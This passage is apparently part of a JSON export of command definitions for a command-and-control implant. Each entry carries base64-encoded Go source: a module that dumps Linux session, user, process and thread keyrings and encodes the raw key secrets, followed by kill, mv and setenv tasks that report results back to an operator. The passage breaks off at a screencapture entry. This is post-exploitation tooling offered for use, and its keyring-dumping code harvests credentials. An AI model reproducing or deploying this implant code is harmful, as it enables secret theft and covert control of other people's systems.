W9uZGV0YWlscyBganNvbjoicGVybWlzc2lvbnMiYAoJS2V5dHlwZSAgICAgc3RyaW5nICAgICAgICAgICAgYGpzb246ImtleXR5cGUiYAoJVUlEICAgICAgICAgaW50ICAgICAgICAgICAgICAgYGpzb246InVpZCJgCglWYWxpZCAgICAgICBib29sICAgICAgICAgICAgICBganNvbjoidmFsaWQiYAoJRGF0YSAgICAgICAgc3RyaW5nICAgICAgICAgICAgYGpzb246InN0cmluZyJgCn0KCi8vUGVybWlzc2lvbmRldGFpbHMgLSBzdHJ1Y3QgdGhhdCBob2xkcyBwZXJtaXNzaW9uIGRldGFpbHMgZm9yIGEgZ2l2ZW4ga2V5CnR5cGUgUGVybWlzc2lvbmRldGFpbHMgc3RydWN0IHsKCVVzZXIgICAgc3RyaW5nIGBqc29uOiJ1c2VyImAKCVByb2Nlc3Mgc3RyaW5nIGBqc29uOiJwcm9jZXNzImAKCU90aGVyICAgc3RyaW5nIGBqc29uOiJvdGhlciJgCglHcm91cCAgIHN0cmluZyBganNvbjoiZ3JvdXAiYAp9CgovL0tleUNvbnRlbnRzIC0gc3RydWN0IHRoYXQgcmVwcmVzZW50IHJhdyBrZXkgY29udGVudHMKdHlwZSBMaW51eEtleUluZm9ybWF0aW9uIHN0cnVjdCB7CglLZXlUeXBlIHN0cmluZwoJS2V5RGF0YSBbXWJ5dGUKfQoKLy9UeXBlIC0gVGhlIHR5cGUgb2Yga2V5IGluZm9ybWF0aW9uLiBLZXlyaW5nIG9yIGtleWNoYWluCmZ1bmMgKGwgKkxpbnV4S2V5SW5mb3JtYXRpb24pIFR5cGUoKSBzdHJpbmcgewoJcmV0dXJuIGwuS2V5VHlwZQp9CgovL0tleURhdGEgLSBSZXRyaWV2ZSB0aGUga2V5ZGF0YSBhcyBhIHJhdyBqc29uIHN0cmluZwpmdW5jIChsICpMaW51eEtleUluZm9ybWF0aW9uKSBEYXRhKCkgW11ieXRlIHsKCXJldHVybiBsLktleURhdGEKfQoKZnVuYyBnZXRrZXlkYXRhKG9wdHMgT3B0aW9ucykgKExpbnV4S2V5SW5mb3JtYXRpb24sIGVycm9yKSB7CgkvL0NoZWNrIGlmIHRoZSB0eXBlcyBhcmUgYXZhaWxhYmxlCglkIDo9IExpbnV4S2V5SW5mb3JtYXRpb257fQoJc3dpdGNoIG9wdHMuQ29tbWFuZCB7CgljYXNlICJkdW1wc2Vzc2lvbiI6CgkJa2V5cywgZXJyIDo9IExpc3RLZXlzRm9yU2Vzc2lvbigpCgkJaWYgZXJyICE9IG5pbCB7CgkJCXJldHVybiBkLCBlcnIKCQl9CgoJCXIgOj0gS2V5cmVzdWx0c3t9CgkJci5SZXN1bHRzID0ga2V5cwoKCQlqc29uS2V5cywgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyLCAiIiwgIgkiKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlkLktleURhdGEgPSBqc29uS2V5cwoJCWQuS2V5VHlwZSA9ICJrZXlyaW5nIgoJCWJyZWFrCgljYXNlICJkdW1wdXNlciI6CgkJa2V5cywgZXJyIDo9IExpc3RLZXlzRm9yVXNlclNlc3Npb24oKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlyIDo9IEtleXJlc3VsdHN7fQoJCXIuUmVzdWx0cyA9IGtleXMKCgkJanNvbktleXMsIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQociwgIiIsICIJIikKCQlpZiBlcnIgIT0gbmlsIHsKCQkJcmV0dXJuIGQsIGVycgoJCX0KCgkJZC5LZXlEYXRhID0ganNvbktleXMKCQlkLktleVR5cGUgPSAia2V5cmluZyIKCQlicmVhawoJY2FzZSAic2VhcmNoIjoKCQlrZXksIGVyciA6PSBTZWFyY2hjdXJyZW50c2Vzc2lvbmtleXJpbmcob3B0cy5LZXl3b3JkKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlyIDo9IEtleXJlc3VsdHN7fQoJCXIuUmVzdWx0cyA9IGtleQoKCQlqc29uS2V5cywgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyLCAiIiwgIgkiKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlkLktleURhdGEgPSBqc29uS2V5cwoJCWQuS2V5VHlwZSA9ICJrZXlyaW5nIgoJCWJyZWFrCgljYXNlICJzZWFyY2h3aXRodHlwZSI6CgkJa2V5LCBlcnIgOj0gU2VhcmNoZm9ya2V5d2l0aHR5cGUob3B0cy5LZXl3b3JkLCBvcHRzLlR5cGVuYW1lKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlyIDo9IEtleXJlc3VsdHN7fQoJCXIuUmVzdWx0cyA9IGtleQoKCQlqc29uS2V5cywgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyLCAiIiwgIgkiKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlkLktleURhdGEgPSBqc29uS2V5cwoJCWQuS2V5VHlwZSA9ICJrZXlyaW5nIgoJCWJyZWFrCgljYXNlICJkdW1wcHJvY2VzcyI6CgkJa2V5cywgZXJyIDo9IExpc3RLZXlzRm9yUHJvY2VzcygpCgkJaWYgZXJyICE9IG5pbCB7CgkJCXJldHVybiBkLCBlcnIKCQl9CgoJCXIgOj0gS2V5cmVzdWx0c3t9CgkJci5SZXN1bHRzID0ga2V5cwoKCQlqc29uS2V5cywgZXJyIDo9IGpzb24uTWFyc2hhbEluZGVudChyLCAiIiwgIgkiKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlkLktleURhdGEgPSBqc29uS2V5cwoJCWQuS2V5VHlwZSA9ICJrZXlyaW5nIgoJCWJyZWFrCgoJY2FzZSAiZHVtcHRocmVhZHMiOgoJCWtleXMsIGVyciA6PSBMaXN0S2V5c0ZvclRocmVhZHMoKQoJCWlmIGVyciAhPSBuaWwgewoJCQlyZXR1cm4gZCwgZXJyCgkJfQoKCQlyIDo9IEtleXJlc3VsdHN7fQoJCXIuUmVzdWx0cyA9IGtleXMKCgkJanNvbktleXMsIGVyciA6PSBqc29uLk1hcnNoYWxJbmRlbnQociwgIiIsICIJIikKCQlpZiBlcnIgIT0gbmlsIHsKCQkJcmV0dXJuIGQsIGVycgoJCX0KCgkJZC5LZXlEYXRhID0ganNvbktleXMKCQlkLktleVR5cGUgPSAia2V5cmluZyIKCQlicmVhawoJfQoKCXJldHVybiBkLCBuaWwKfQoKLy9MaXN0S2V5c0ZvclNlc3Npb24gLSBMaXN0IGFsbCBvZiB0aGUga2V5cyBmb3IgdGhlIGN1cnJlbnQgc2Vzc2lvbgpmdW5jIExpc3RLZXlzRm9yU2Vzc2lvbigpIChbXUtleWRldGFpbHMsIGVycm9yKSB7CglrZXlyaW5nLCBlcnIgOj0ga2V5Y3RsLlNlc3Npb25LZXlyaW5nKCkKCglpZiBlcnIgIT0gbmlsIHsKCQlsb2cuUHJpbnRmKCJGYWlsZWQgdG8gZ2V0IHNlc3Npb24ga2V5cmluZzogJXMiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gbmlsLCBlcnIKCX0KCglrZXlzLCBlcnIgOj0ga2V5Y3RsLkxpc3RLZXlyaW5nKGtleXJpbmcpCgoJaWYgZXJyICE9IG5pbCB7CgkJbG9nLlByaW50ZigiVW5hYmxlIHRvIGdldCBrZXkgY29udGVudHMiKQoJCXJldHVybiBuaWwsIGVycgoJfQoKCXJlcyA6PSBtYWtlKFtdS2V5ZGV0YWlscywgbGVuKGtleXMpKQoKCWZvciBpLCBrZXkgOj0gcmFuZ2Uga2V5cyB7CgkJaW5mbywgXyA6PSBrZXkuSW5mbygpCgkJcmVzW2ldLk5hbWUgPSBpbmZvLk5hbWUKCQlyZXNbaV0uSUQgPSBrZXkuSWQKCQlyZXNbaV0uS2V5dHlwZSA9IGluZm8uVHlwZQoJCXJlc1tpXS5VSUQgPSBpbmZvLlVpZAoJCXJlc1tpXS5WYWxpZCA9IGluZm8uVmFsaWQoKQoJCXJlc1tpXS5QZXJtaXNzaW9ucy5Vc2VyID0gaW5mby5QZXJtLlVzZXIoKQoJCXJlc1tpXS5QZXJtaXNzaW9ucy5Hcm91cCA9IGluZm8uUGVybS5Hcm91cCgpCgkJcmVzW2ldLlBlcm1pc3Npb25zLlByb2Nlc3MgPSBpbmZvLlBlcm0uUHJvY2VzcygpCgkJcmVzW2ldLlBlcm1pc3Npb25zLk90aGVyID0gaW5mby5QZXJtLk90aGVyKCkKCgl9CgoJcmV0dXJuIHJlcywgbmlsCn0KCmZ1bmMgU2VhcmNoZm9ya2V5d2l0aHR5cGUobmFtZSBzdHJpbmcsIHR5cGVOYW1lIHN0cmluZykgKFtdS2V5ZGV0YWlscywgZXJyb3IpIHsKCWtleXJpbmcsIGVyciA6PSBrZXljdGwuU2Vzc2lvbktleXJpbmcoKQoJaWYgZXJyICE9IG5pbCB7CgkJbG9nLlByaW50ZigiRmFpbGVkIHRvIGdldCBzZXNzaW9uIGtleXJpbmc6ICVzIiwgZXJyLkVycm9yKCkpCgkJcmV0dXJuIG5pbCwgZXJyCgl9CgoJa2V5LCBlcnIgOj0ga2V5cmluZy5TZWFyY2hXaXRoVHlwZShuYW1lLCB0eXBlTmFtZSkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiBuaWwsIGVycgoJfQoKCXJlcyA6PSBtYWtlKFtdS2V5ZGV0YWlscywgMSkKCWluZm8sIF8gOj0ga2V5LkluZm8oKQoJcmF3LCBlcnIgOj0ga2V5LkdldCgpCgoJcmVzWzBdLk5hbWUgPSBpbmZvLk5hbWUKCXJlc1swXS5JRCA9IGtleS5JZCgpCgoJaWYgZXJyID09IG5pbCB7CgkJcmVzWzBdLkRhdGEgPSBiYXNlNjQuU3RkRW5jb2RpbmcuRW5jb2RlVG9TdHJpbmcocmF3KQoJfQoKCXJlc1swXS5LZXl0eXBlID0gaW5mby5UeXBlCglyZXNbMF0uVUlEID0gaW5mby5VaWQKCXJlc1swXS5WYWxpZCA9IGluZm8uVmFsaWQoKQoJcmVzWzBdLlBlcm1pc3Npb25zLlVzZXIgPSBpbmZvLlBlcm0uVXNlcigpCglyZXNbMF0uUGVybWlzc2lvbnMuR3JvdXAgPSBpbmZvLlBlcm0uR3JvdXAoKQoJcmVzWzBdLlBlcm1pc3Npb25zLlByb2Nlc3MgPSBpbmZvLlBlcm0uUHJvY2VzcygpCglyZXNbMF0uUGVybWlzc2lvbnMuT3RoZXIgPSBpbmZvLlBlcm0uT3RoZXIoKQoKCXJldHVybiByZXMsIG5pbAp9CgpmdW5jIExpc3RLZXlzRm9yVGhyZWFkcygpIChbXUtleWRldGFpbHMsIGVycm9yKSB7CglrZXlyaW5nLCBlcnIgOj0ga2V5Y3RsLlRocmVhZEtleXJpbmcoKQoJaWYgZXJyICE9IG5pbCB7CgkJbG9nLlByaW50ZigiRmFpbGVkIHRvIGdldCBzZXNzaW9uIGtleXJpbmc6ICVzIiwgZXJyLkVycm9yKCkpCgkJcmV0dXJuIG5pbCwgZXJyCgl9CgoJa2V5cywgZXJyIDo9IGtleWN0bC5MaXN0S2V5cmluZyhrZXlyaW5nKQoKCWlmIGVyciAhPSBuaWwgewoJCWxvZy5QcmludGYoIlVuYWJsZSB0byBnZXQga2V5IGNvbnRlbnRzIikKCQlyZXR1cm4gbmlsLCBlcnIKCX0KCglyZXMgOj0gbWFrZShbXUtleWRldGFpbHMsIGxlbihrZXlzKSkKCglmb3IgaSwga2V5IDo9IHJhbmdlIGtleXMgewoJCWluZm8sIF8gOj0ga2V5LkluZm8oKQoJCXJlc1tpXS5OYW1lID0gaW5mby5OYW1lCgkJcmVzW2ldLklEID0ga2V5LklkCgkJcmVzW2ldLktleXR5cGUgPSBpbmZvLlR5cGUKCQlyZXNbaV0uVUlEID0gaW5mby5VaWQKCQlyZXNbaV0uVmFsaWQgPSBpbmZvLlZhbGlkKCkKCgkJcmVzW2ldLlBlcm1pc3Npb25zLlVzZXIgPSBpbmZvLlBlcm0uVXNlcigpCgkJcmVzW2ldLlBlcm1pc3Npb25zLkdyb3VwID0gaW5mby5QZXJtLkdyb3VwKCkKCQlyZXNbaV0uUGVybWlzc2lvbnMuUHJvY2VzcyA9IGluZm8uUGVybS5Qcm9jZXNzKCkKCQlyZXNbaV0uUGVybWlzc2lvbnMuT3RoZXIgPSBpbmZvLlBlcm0uT3RoZXIoKQoKCX0KCglyZXR1cm4gcmVzLCBuaWwKfQoKZnVuYyBMaXN0S2V5c0ZvclByb2Nlc3MoKSAoW11LZXlkZXRhaWxzLCBlcnJvcikgewoJa2V5cmluZywgZXJyIDo9IGtleWN0bC5Qcm9jZXNzS2V5cmluZygpCglpZiBlcnIgIT0gbmlsIHsKCQlsb2cuUHJpbnRmKCJGYWlsZWQgdG8gZ2V0IHNlc3Npb24ga2V5cmluZzogJXMiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gbmlsLCBlcnIKCX0KCglrZXlzLCBlcnIgOj0ga2V5Y3RsLkxpc3RLZXlyaW5nKGtleXJpbmcpCgoJaWYgZXJyICE9IG5pbCB7CgkJbG9nLlByaW50ZigiVW5hYmxlIHRvIGdldCBrZXkgY29udGVudHMiKQoJCXJldHVybiBuaWwsIGVycgoJfQoKCXJlcyA6PSBtYWtlKFtdS2V5ZGV0YWlscywgbGVuKGtleXMpKQoKCWZvciBpLCBrZXkgOj0gcmFuZ2Uga2V5cyB7CgkJaW5mbywgXyA6PSBrZXkuSW5mbygpCgkJcmVzW2ldLk5hbWUgPSBpbmZvLk5hbWUKCQlyZXNbaV0uSUQgPSBrZXkuSWQKCQlyZXNbaV0uS2V5dHlwZSA9IGluZm8uVHlwZQoJCXJlc1tpXS5VSUQgPSBpbmZvLlVpZAoJCXJlc1tpXS5WYWxpZCA9IGluZm8uVmFsaWQoKQoKCQlyZXNbaV0uUGVybWlzc2lvbnMuVXNlciA9IGluZm8uUGVybS5Vc2VyKCkKCQlyZXNbaV0uUGVybWlzc2lvbnMuR3JvdXAgPSBpbmZvLlBlcm0uR3JvdXAoKQoJCXJlc1tpXS5QZXJtaXNzaW9ucy5Qcm9jZXNzID0gaW5mby5QZXJtLlByb2Nlc3MoKQoJCXJlc1tpXS5QZXJtaXNzaW9ucy5PdGhlciA9IGluZm8uUGVybS5PdGhlcigpCgoJfQoKCXJldHVybiByZXMsIG5pbAp9CgovL0xpc3RLZXlzRm9yVXNlclNlc3Npb24gLSBMaXN0IGFsbCBvZiB0aGUga2V5cyBwcml2YXRlIHRvIHRoZSBjdXJyZW50IHVzZXIKZnVuYyBMaXN0S2V5c0ZvclVzZXJTZXNzaW9uKCkgKFtdS2V5ZGV0YWlscywgZXJyb3IpIHsKCWtleXJpbmcsIGVyciA6PSBrZXljdGwuVXNlclNlc3Npb25LZXlyaW5nKCkKCWlmIGVyciAhPSBuaWwgewoJCWxvZy5QcmludGYoIkZhaWxlZCB0byBnZXQgc2Vzc2lvbiBrZXlyaW5nOiAlcyIsIGVyci5FcnJvcigpKQoJCXJldHVybiBuaWwsIGVycgoJfQoKCWtleXMsIGVyciA6PSBrZXljdGwuTGlzdEtleXJpbmcoa2V5cmluZykKCglpZiBlcnIgIT0gbmlsIHsKCQlsb2cuUHJpbnRmKCJVbmFibGUgdG8gZ2V0IGtleSBjb250ZW50cyIpCgkJcmV0dXJuIG5pbCwgZXJyCgl9CgoJcmVzIDo9IG1ha2UoW11LZXlkZXRhaWxzLCBsZW4oa2V5cykpCgoJZm9yIGksIGtleSA6PSByYW5nZSBrZXlzIHsKCQlpbmZvLCBfIDo9IGtleS5JbmZvKCkKCQlyZXNbaV0uTmFtZSA9IGluZm8uTmFtZQoJCXJlc1tpXS5JRCA9IGtleS5JZAoJCXJlc1tpXS5LZXl0eXBlID0gaW5mby5UeXBlCgkJcmVzW2ldLlVJRCA9IGluZm8uVWlkCgkJcmVzW2ldLlZhbGlkID0gaW5mby5WYWxpZCgpCgoJCXJlc1tpXS5QZXJtaXNzaW9ucy5Vc2VyID0gaW5mby5QZXJtLlVzZXIoKQoJCXJlc1tpXS5QZXJtaXNzaW9ucy5Hcm91cCA9IGluZm8uUGVybS5Hcm91cCgpCgkJcmVzW2ldLlBlcm1pc3Npb25zLlByb2Nlc3MgPSBpbmZvLlBlcm0uUHJvY2VzcygpCgkJcmVzW2ldLlBlcm1pc3Npb25zLk90aGVyID0gaW5mby5QZXJtLk90aGVyKCkKCgl9CgoJcmV0dXJuIHJlcywgbmlsCn0KCmZ1bmMgU2VhcmNoY3VycmVudHNlc3Npb25rZXlyaW5nKG5hbWUgc3RyaW5nKSAoW11LZXlkZXRhaWxzLCBlcnJvcikgewoJa2V5cmluZywgZXJyIDo9IGtleWN0bC5TZXNzaW9uS2V5cmluZygpCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gbmlsLCBlcnIKCX0KCglrZXksIGVyciA6PSBrZXlyaW5nLlNlYXJjaChuYW1lKQoJaWYgZXJyICE9IG5pbCB7CgkJcmV0dXJuIG5pbCwgZXJyCgl9CgoJcmVzIDo9IG1ha2UoW11LZXlkZXRhaWxzLCAxKQoJaW5mbywgXyA6PSBrZXkuSW5mbygpCglyYXcsIGVyciA6PSBrZXkuR2V0KCkKCglyZXNbMF0uTmFtZSA9IGluZm8uTmFtZQoJcmVzWzBdLklEID0ga2V5LklkKCkKCglpZiBlcnIgPT0gbmlsIHsKCQlyZXNbMF0uRGF0YSA9IGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhyYXcpCgl9CgoJcmVzWzBdLktleXR5cGUgPSBpbmZvLlR5cGUKCXJlc1swXS5VSUQgPSBpbmZvLlVpZAoJcmVzWzBdLlZhbGlkID0gaW5mby5WYWxpZCgpCglyZXNbMF0uUGVybWlzc2lvbnMuVXNlciA9IGluZm8uUGVybS5Vc2VyKCkKCXJlc1swXS5QZXJtaXNzaW9ucy5Hcm91cCA9IGluZm8uUGVybS5Hcm91cCgpCglyZXNbMF0uUGVybWlzc2lvbnMuUHJvY2VzcyA9IGluZm8uUGVybS5Qcm9jZXNzKCkKCXJlc1swXS5QZXJtaXNzaW9ucy5PdGhlciA9IGluZm8uUGVybS5PdGhlcigpCgoJcmV0dXJuIHJlcywgbmlsCn0K"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "kill [pid]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Kill a process specified by PID.",
          "cmd": "kill",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "kill.go": "cGFja2FnZSBraWxsCgppbXBvcnQgKAoJImZtdCIKCSJvcyIKCSJzdHJjb252IgoJInN5c2NhbGwiCgkiZW5jb2RpbmcvanNvbiIKCSJzeW5jIgoJInBrZy9wcm9maWxlcyIKCSJwa2cvdXRpbHMvc3RydWN0cyIKKQoKdmFyIG11IHN5bmMuTXV0ZXgKCi8vUnVuIC0gRnVuY3Rpb24gdGhhdCBleGVjdXRlcyB0aGUgc2hlbGwgY29tbWFuZApmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECgoJcGlkLCBlcnIgOj0gc3RyY29udi5BdG9pKHRhc2suUGFyYW1zKQoKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglwLCBlcnIgOj0gb3MuRmluZFByb2Nlc3MocGlkKQoKCWlmIGVyciAhPSBuaWwgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglwLlNpZ25hbChzeXNjYWxsLlNJR0tJTEwpCgltc2cuQ29tcGxldGVkID0gdHJ1ZQoJbXNnLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiS2lsbGVkIHByb2Nlc3Mgd2l0aCBQSUQgJXMiLCB0YXNrLlBhcmFtcykKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "mv [source] [destination] (or from the GUI)",
          "version": 5,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Move a file from one location to another.",
          "cmd": "mv",
          "parameters": [
            {
              "type": "String",
              "hint": "Source file to move.",
              "choices": "",
              "required": true,
              "name": "source"
            },
            {
              "type": "String",
              "hint": "Source will move to this location.",
              "choices": "",
              "required": true,
              "name": "destination"
            }
          ],
          "attack": [],
          "artifacts": [
            {
              "command_parameter": "destination",
              "artifact": "File Create",
              "artifact_string": "File * created.",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "mv.go": "cGFja2FnZSBtdgoKaW1wb3J0ICgKCSJlbmNvZGluZy9qc29uIgoJImZtdCIKCSJvcyIKCgkicGtnL3V0aWxzL3N0cnVjdHMiCgkic3luYyIKCSJwa2cvcHJvZmlsZXMiCikKCnZhciBtdSBzeW5jLk11dGV4Cgp0eXBlIEFyZ3VtZW50cyBzdHJ1Y3QgewoJU291cmNlRmlsZSAgICAgIHN0cmluZyBganNvbjoic291cmNlImAKCURlc3RpbmF0aW9uRmlsZSBzdHJpbmcgYGpzb246ImRlc3RpbmF0aW9uImAKfQoKZnVuYyBSdW4odGFzayBzdHJ1Y3RzLlRhc2spIHsKCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoKCXZhciBhcmdzIEFyZ3VtZW50cwoJZXJyIDo9IGpzb24uVW5tYXJzaGFsKFtdYnl0ZSh0YXNrLlBhcmFtcyksICZhcmdzKQoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCWlmIF8sIGVyciA9IG9zLlN0YXQoYXJncy5Tb3VyY2VGaWxlKTsgb3MuSXNOb3RFeGlzdChlcnIpIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJZXJyID0gb3MuUmVuYW1lKGFyZ3MuU291cmNlRmlsZSwgYXJncy5EZXN0aW5hdGlvbkZpbGUpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoJbXNnLkNvbXBsZXRlZCA9IHRydWUKCW1zZy5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIk1vdmVkICVzIHRvICVzIiwgYXJncy5Tb3VyY2VGaWxlLCBhcmdzLkRlc3RpbmF0aW9uRmlsZSkKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "setenv [param] [value]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Sets an environment variable to your choosing.",
          "cmd": "setenv",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [
            {
              "setenv.go": "cGFja2FnZSBzZXRlbnYKCmltcG9ydCAoCgkiZm10IgoJIm9zIgoJInN0cmluZ3MiCgkiZW5jb2RpbmcvanNvbiIKCSJwa2cvdXRpbHMvc3RydWN0cyIKCSJzeW5jIgoJInBrZy9wcm9maWxlcyIKKQoKdmFyIG11IHN5bmMuTXV0ZXgKCi8vUnVuIC0gRnVuY3Rpb24gdGhhdCBleGVjdXRlcyB0aGUgc2hlbGwgY29tbWFuZApmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECglwYXJ0cyA6PSBzdHJpbmdzLlNwbGl0QWZ0ZXJOKHRhc2suUGFyYW1zLCAiICIsIDIpCglwYXJ0c1swXSA9IHN0cmluZ3MuVHJpbVNwYWNlKHBhcnRzWzBdKQoJcGFydHNbMV0gPSBzdHJpbmdzLlRyaW1TcGFjZShwYXJ0c1sxXSkKCWlmIGxlbihwYXJ0cykgIT0gMiB7CgkJbXNnLlVzZXJPdXRwdXQgPSAiTm90IGVub3VnaCBwYXJhbWV0ZXJzIgoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoJZXJyIDo9IG9zLlNldGVudihwYXJ0c1swXSwgcGFydHNbMV0pCglpZiBlcnIgIT0gbmlsIHsKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9Cgltc2cuQ29tcGxldGVkID0gdHJ1ZQoJbXNnLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiU2V0ICVzPSVzIiwgcGFydHNbMF0sIHBhcnRzWzFdKQoJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJbXUuTG9jaygpCglwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0K"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "screencapture",
          "version": 5,
